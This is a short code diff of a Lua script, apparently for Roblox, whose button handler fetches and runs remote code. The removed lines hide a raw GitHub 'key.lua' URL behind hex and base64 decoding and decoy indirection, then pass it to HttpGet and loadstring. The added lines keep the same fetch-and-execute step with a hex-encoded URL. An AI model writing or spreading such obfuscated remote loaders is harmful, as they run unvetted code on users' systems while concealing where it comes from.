@@ -107,15 +107,7 @@ BTN.MouseButton1Click:Connect(function()
         end
         return res
     end
-local t = {["a"]="68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6e6968616f6e6968616f6e6968616f6e2d736f757263652f5844472d484f422f6d61696e2f6b65792e6c7561"}
-local function j(s) local r="" for i=1,#s,2 do r=r..string.char(tonumber(s:sub(i,i+1),16)) end return r end
-local function l(s) local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' s=string.gsub(s,'[^'..b..'=]','') return (s:gsub('.',function(x) if x=='='then return'' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%(2^i)-f%(2^(i-1))>0 and'1'or'0')end return r end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x) if #x~=8 then return''end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1'and 2^(8-i)or 0)end return string.char(c) end)) end
-local v = math.random(999,9999999)
-local w = j(t["a"])
-local x = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25paGFvbmlhaW9uLXNvdXJjZS9YREctSE9CL21haW4va2V5Lmx1YQ=="
-local z = setmetatable({get=function() return w end}, {}) 
-local k = ({game = game})["game"]
-local url = (w==j(t["a"])) and l(x) or z.get()
-local s = k:HttpGet(url)
-assert(type(s)=="string" and #s>0,"Remote script load failed! URL: "..url)
-loadstring(s)()
+    local encUrl = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6e6968616f6e6968616f6e6968616f6e2d736f757263652f5844472d484f422f6d61696e2f6b65792e6c7561"
+    local decodedUrl = decode(encUrl)
+    loadstring(game:HttpGet(decodedUrl))()
+end)
